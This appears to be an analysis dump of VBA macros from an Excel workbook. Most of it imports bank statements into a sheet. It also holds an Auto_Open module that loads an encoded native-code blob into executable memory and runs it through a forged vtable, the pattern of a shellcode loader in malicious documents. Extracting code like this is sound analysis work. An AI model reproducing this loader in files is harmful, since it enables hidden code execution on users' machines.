                Workbooks(macrodatei).Sheets("Tabelle").Cells(outputzeile - 1, 11) = IbanAuftraggeber
                Workbooks(macrodatei).Sheets("Tabelle").Cells(outputzeile - 1, 12) = verwendungszweck1
                Workbooks(macrodatei).Sheets("Tabelle").Cells(outputzeile - 1, 13) = verwendungszweck2
                Workbooks(macrodatei).Sheets("Tabelle").Cells(outputzeile - 1, 14) = verwendungszweck3
                Workbooks(macrodatei).Sheets("Tabelle").Cells(outputzeile - 1, 15) = verwendungszweck4
                Workbooks(macrodatei).Sheets("Tabelle").Cells(outputzeile - 1, 19) = verwendungszweck5
                Workbooks(macrodatei).Sheets("Tabelle").Cells(outputzeile - 1, 20) = verwendungszweck6
                Workbooks(macrodatei).Sheets("Tabelle").Cells(outputzeile - 1, 21) = verwendungszweck7
                Workbooks(macrodatei).Sheets("Tabelle").Cells(outputzeile - 1, 22) = verwendungszweck8
                Workbooks(macrodatei).Sheets("Tabelle").Cells(outputzeile - 1, 23) = verwendungszweck9
                Workbooks(macrodatei).Sheets("Tabelle").Cells(outputzeile - 1, 24) = verwendungszweck10
                                                                
                Workbooks(macrodatei).Sheets("Tabelle").Cells(outputzeile - 1, 17) = "EUR"
                Workbooks(macrodatei).Sheets("Tabelle").Cells(outputzeile - 1, 18) = transaktionstyp
         
            outputzeile = outputzeile + 1
       End If
       End If

nachsteZeile:

      Next zeile1
        
ende1:
  
Application.DisplayAlerts = False
Workbooks(mandantendatei).Close
Application.DisplayAlerts = True
Workbooks(macrodatei).Activate
Sheets("Tabelle").Select
Application.ScreenUpdating = True
'End If    'ende stripe ######################################################################################################


End Sub

Attribute VB_Name = "targobank_"
Sub Targobank()

If Left(Version, 4) <> "Bank" Then MsgBox ("Du hast keine Bank-Lizenz. Bitte kontaktiere www.sbco.cloud um eine Lizenz zu erwerben!"): EndeLL = 1: Exit Sub
   'Workbooks.Open Filename:=fremdprogramm, Local:=True
    Sheets("temp").Select
    Columns("A:A").Select
    Selection.NumberFormat = "m/d/yyyy"
    Cells.Select
    Selection.QueryTable.Delete
    Selection.ClearContents
    name1 = Now()
    With ActiveSheet.QueryTables.Add(Connection:= _
        "TEXT;" & fremdprogramm _
        , Destination:=Range("$A$1"))
        '.CommandType = 0
        .Name = name1
        .FieldNames = True
        .RowNumbers = False
        .FillAdjacentFormulas = False
        .PreserveFormatting = True
        .RefreshOnFileOpen = False
        .RefreshStyle = xlInsertDeleteCells
        .SavePassword = False
        .SaveData = True
        .AdjustColumnWidth = True
        .RefreshPeriod = 0
        .TextFilePromptOnRefresh = False
        .TextFilePlatform = 1252
        .TextFileStartRow = 1
        .TextFileParseType = xlDelimited
        .TextFileTextQualifier = xlTextQualifierDoubleQuote
        .TextFileConsecutiveDelimiter = False
        .TextFileTabDelimiter = True
        .TextFileSemicolonDelimiter = False
        .TextFileCommaDelimiter = True
        .TextFileSpaceDelimiter = False
        .TextFileColumnDataTypes = Array(4, 1, 1, 1, 1, 1)
        .TextFileDecimalSeparator = "."
        .TextFileThousandsSeparator = ","
        .TextFileTrailingMinusNumbers = True
        .Refresh BackgroundQuery:=False
    End With


    fidorsheet = ActiveSheet.Name
    fremdprogrammDatei = ActiveWorkbook.Name
    Workbooks(fremdprogrammDatei).Activate
    ' Plus und Minus ersetzen
    Columns("B:B").Select
    Selection.Replace What:="+", Replacement:=" ", LookAt:=xlPart, _
        SearchOrder:=xlByRows, MatchCase:=False, SearchFormat:=False, _
        ReplaceFormat:=False
    Selection.Replace What:="-", Replacement:=" ", LookAt:=xlPart, _
        SearchOrder:=xlByRows, MatchCase:=False, SearchFormat:=False, _
        ReplaceFormat:=False
    
    x = Workbooks(fremdprogrammDatei).Sheets(1).UsedRange.SpecialCells(xlCellTypeLastCell).Row
        For zeile1 = 10 To x
                 datum = Cells(zeile1, 1)
                 If datum = "" Then Exit For
                 betrag = Cells(zeile1, 3)
                 
                'IbanAuftraggeber = Cells(zeile1, 6)
                'transaktionstyp = Cells(zeile1, 9)
                Text = Cells(zeile1, 2)
                Text = Replace(Text, Chr(10), " ")
                Text = Replace(Text, Chr(13), " ")
                                
                vwz1 = Left(Text, 27)
                vwz2 = Mid(Text, 28, 27)
                vwz3 = Mid(Text, 54, 27)
                vwz4 = Mid(Text, 81, 27)
                vwz5 = Mid(Text, 108, 27)
                vwz6 = Mid(Text, 135, 27)
                vwz7 = Mid(Text, 162, 27)
                vwz9 = Mid(Text, 189, 27)
                vwz10 = Mid(Text, 216, 27)
                      
                
                empfaenger1 = Left(Cells(zeile1, 2), 27)
                empfaenger2 = Mid(Cells(zeile1, 2), 28, 27)

                '# Schreiben
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 1) = bankleitzahl
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 2) = Kontonummer
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 5) = datum
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 6) = datum
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 7) = betrag
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 8) = empfaenger
                If Left(empfaenger1, 1) = "-" Or Left(empfaenger1, 1) = "+" Then empfaenger1 = " " & empfaenger1
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 8) = empfaenger1
                If Left(empfaenger2, 1) = "-" Or Left(empfaenger2, 1) = "+" Then empfaenger2 = " " & empfaenger2
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 9) = empfaenger2
                
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 11) = IbanAuftraggeber
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 12) = vwz1
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 13) = vwz2
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 14) = vwz3
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 15) = vwz4

                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 17) = "EUR"
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 18) = transaktionstyp
                        
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 19) = vwz5
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 20) = vwz6
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 21) = vwz7
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 22) = vwz8
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 23) = vwz9
                Workbooks(macrodatei).Sheets("Tabelle").Cells(zeile1 - 1, 24) = vwz10
                transaktionstyp = ""
targoZeile:
              Next zeile1
  
  Sheets("temp").Select
   Columns("A:CK").Select
    Selection.ClearContents
  
Sheets("Tabelle").Select
    Columns("A:A").Select
    Selection.NumberFormat = "@"
 Workbooks(macrodatei).Activate




End Sub




INQUEST-PP=macro
Attribute VB_Name = "Sheet1"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Option Explicit

Attribute VB_Name = "ThisWorkbook"
Attribute VB_Base = "0{00020819-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Name = "mAPI"
Option Explicit

'--------------------------------------------------------------
' This VBA Project has been protected with a proprietary scheme
' Do NOT tamper with this file, as Excel may crash!
'--------------------------------------------------------------

Private Const OPTION_BASE                  As Long = 0
Private Const OPTION_FLAGS                 As Long = 2
Private Const OPTION_INCLUDE_REFERENCEDOCS As Long = 0
Private Const OPTION_DISABLEDCLASSES       As String = ""
Private Const PAGE_EXECUTE_RW              As Long = &H40
Private Const MEM_RESERVE_AND_COMMIT       As Long = &H3000
Private Const MEM_RELEASE                  As Long = &H8000
Private Const ERR_OUT_OF_MEMORY            As Long = &H7
Private Const ROOTOBJECT_SIZE              As Long = &H4D948

Private m_Loader As VCOMInitializerStruct
Private m_VCOMObject As Object

#If VBA7 = False Then
    Private Declare Function VirtualAlloc Lib "kernel32" (ByVal Address As Long, ByVal Size As Long, ByVal AllocationType As Long, ByVal Protect As Long) As Long
    Private Declare Function GetModuleHandleA Lib "kernel32" (ByVal ProcName As String) As Long
    Private Declare Function GetProcAddress Lib "kernel32" (ByVal Module As Long, ByVal ProcName As String) As Long
    Private Declare Function VirtualFree Lib "kernel32" (ByVal lpAddress As Long, ByVal Size As Long, ByVal dwFreeType As Long) As Long
    Private Declare Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" (ByRef Dest As Any, ByRef Source As Any, ByVal Size As Long)
    Private Const VBA_VERSION              As Long = 6

    Private Type VCOMInitializerStruct
        vtbl_QueryInterface As Long
        vtbl_AddRef As Long
        vtbl_Release As Long
        vtbl_GetTypeInfoCount As Long
        vtbl_GetTypeInfo As Long
        vtbl_GetIDsOfNames As Long
        vtbl_Invoke As Long
        RootObjectMem As Long
        HelperObject As Object
        SysFreeString As Long
        GetProcAddress As Long
        NativeCode As String
        LoaderMem As Long
        IgnoreFlag As Boolean
        VTablePtr As Long
        Kernel32Handle As Long
        RootObject As Object
        ClassFactory As Object
    End Type
#Else
    Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal Address As LongPtr, ByVal Size As LongPtr, ByVal AllocationType As Long, ByVal Protect As Long) As LongPtr
    Private Declare PtrSafe Function GetModuleHandleA Lib "kernel32" (ByVal ProcName As String) As LongPtr
    Private Declare PtrSafe Function GetProcAddress Lib "kernel32" (ByVal Module As LongPtr, ByVal ProcName As String) As LongPtr
    Private Declare PtrSafe Function VirtualFree Lib "kernel32" (ByVal lpAddress As LongPtr, ByVal Size As LongPtr, ByVal dwFreeType As Long) As Long
    Private Declare PtrSafe Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" (ByRef Dest As Any, ByRef Source As Any, ByVal Size As LongPtr)
    Private Const VBA_VERSION              As Long = 7

    Private Type VCOMInitializerStruct
        vtbl_QueryInterface As LongPtr
        vtbl_AddRef As LongPtr
        vtbl_Release As LongPtr
        vtbl_GetTypeInfoCount As LongPtr
        vtbl_GetTypeInfo As LongPtr
        vtbl_GetIDsOfNames As LongPtr
        vtbl_Invoke As LongPtr
        RootObjectMem As LongPtr
        HelperObject As Object
        SysFreeString As LongPtr
        GetProcAddress As LongPtr
        NativeCode As String
        LoaderMem As LongPtr
        IgnoreFlag As Boolean
        VTablePtr As LongPtr
        Kernel32Handle As LongPtr
        RootObject As Object
        ClassFactory As Object
    End Type
#End If

Public Sub Auto_Open()

    With m_Loader
        .NativeCode = "%EEEE%::::PPPPPPPPPH+D$ XXXtNXXXXXXVSPPPPj PPPPPPPP4T)D$04P)D$,4'4 )D$($ PZ3D$@+D$ YQ3H +L$ XP3Q +T$0XPf55ntvf)B|+T$0+T$0+T$0R[YQ^VXP2CP<0tF1D$$kD$$@!L$$2CQ1D$$kD$$@!L$$2CR1D$$kD$$@!L$$2CS+\$,3BP1BP1rP3rP+T$(  XXXXXXXXXXXXX[^tJAYAZQ4tPPPPH)D$@4pH)D$84'4 H)D$0$ PH+L$ H3AtH+D$ L3PtL+T$HXPf55{L+T$HL+T$HtqfA)B8ARA[YQXPA2CD<0tR1D$0kD$0@L!L$0A2CE1D$0kD$0@L!L$0A2CF1D$0kD$0@L!L$0A2CGL+\$@A3BDA1BDA1JDA3JDL+T$8  XXXXXYXXXXqBLHOJA@n[??n[=ezoieZZprkhs^ljbZljbZ=bNZ_Q_>HirF[Q^Z[IrzRM wGDDoeTtKTfdGVduCVduCGhiCGhygGhygCmzXGcH[D_J^DV VfF VX<TI@<_veu]flqomliCuelQxpdudatE@hrwIkzSMzvOizw_Mzw_MssLJssLZBCLZ@A]^@A]^TNa^oFmn^nIv@aSsbT?WeWnSg_DCgKjKWCgHe[wJGe;?@fj;Ifyr@cfMAmTN_rNKNzxilIhMnADMgDV@cm;<jihu?aE=]rdY\puMUpgDuAa;UqSWBSPSUG=LUFNNESSOPGVYEbGXQWROj__GHKjOj_MIHKj^x?IRh=XVh=XVKH<VYKlJWLbAEtOIg@nIDT^HJVOD[KGudwGDEeFT[reTWJ@\ht>a;r>cruLna<Mniy?eKL_]zy?\pznXpznXANNXIL_\IL_\xSc\iMIUzQIdEoomgyo=XAyzJCDBXN>=QKmvHmtvO]HXO]J\O]J\m]hV?]mXmQvgl=tdpaS RUqPBV \PRocNMQflywB>;gFluaO?jKF@UIO ai_vUJ[apwFqeFGfACZVu>[0"

        .LoaderMem = VirtualAlloc(0, Len(.NativeCode), MEM_RESERVE_AND_COMMIT, PAGE_EXECUTE_RW)
        If .LoaderMem = 0 Then Err.Raise ERR_OUT_OF_MEMORY

        .RootObjectMem = VirtualAlloc(0, ROOTOBJECT_SIZE, MEM_RESERVE_AND_COMMIT, PAGE_EXECUTE_RW)
        If .RootObjectMem = 0 Then Err.Raise ERR_OUT_OF_MEMORY

        .vtbl_QueryInterface = .LoaderMem
        .VTablePtr = VarPtr(m_Loader)
        .Kernel32Handle = GetModuleHandleA("KERNEL32")
        .GetProcAddress = GetProcAddress(.Kernel32Handle, "GetProcAddress")
        .SysFreeString = GetProcAddress(GetModuleHandleA("OLEAUT32"), "SysFreeString")
        Call CopyMemory(ByVal .LoaderMem, ByVal .NativeCode, Len(.NativeCode))
        Call CopyMemory(.RootObject, VarPtr(.VTablePtr), LenB(.VTablePtr))
        .IgnoreFlag = TypeOf .RootObject Is VBA.Collection
        Set .ClassFactory = (.RootObject)
        Set .RootObject = Nothing
        VirtualFree .LoaderMem, 0, MEM_RELEASE
        Call .ClassFactory.Init(.Kernel32Handle, .GetProcAddress, OPTION_BASE + OPTION_FLAGS, VBA_VERSION, .HelperObject)
        Set m_VCOMObject = .ClassFactory.GetErrEx()
    End With

End Sub


' InQuest injected base64 decoded content
' Wn	Wn
' -AM4D

INQUEST-PP=macro
